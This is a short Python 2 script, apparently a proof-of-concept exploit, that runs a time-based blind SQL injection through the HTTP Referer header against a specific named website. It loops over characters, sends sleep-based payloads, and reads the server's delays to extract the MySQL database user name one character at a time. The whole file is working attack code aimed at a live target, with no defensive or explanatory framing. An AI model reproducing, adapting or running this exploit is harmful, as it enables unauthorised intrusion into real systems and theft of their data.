#encoding=utf-8

import httplib
import time
import string
import sys
import random
import hashlib


headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36'}

payloads = list(string.ascii_lowercase)

for i in range(0,10):
    payloads.append(str(i))
payloads += ['@','_', '.']

print '[%s] Start to retrive MySQL User' % time.strftime('%H:%M:%S', time.localtime())
user = ''

for i in range(1, 30):
    found=False
    while found==False:
        for payload in payloads:
            timeout_count = 0
            for j in range(1,3):   # 2 times to confirm
                try:
                    referer=  str(random.random()) + "aaa'+sleep(if(ascii(mid(lower(user()),{index},1))={char_code},5,0))+'bbb"  + str(random.random())
                    headers['Referer'] = referer.replace('{index}', str(i)).replace('{char_code}', str(ord(payload)))
                    conn = httplib.HTTPConnection('www.tj.focus.cn', timeout=4)
                    conn.request(method='GET',
                                 url='/',
                                 headers=headers)
                    conn.getresponse().read()
                    conn.close()
                    print '.',
                    break

                except Exception, e:
                    timeout_count += 1
                    time.sleep(5)   # wait DB server recover from last query

            if timeout_count == 2:
                user += payload
                print '\n[In progress] now user is %s' % user
                found = True
                break

print '\nFinally, MySQL user is', user
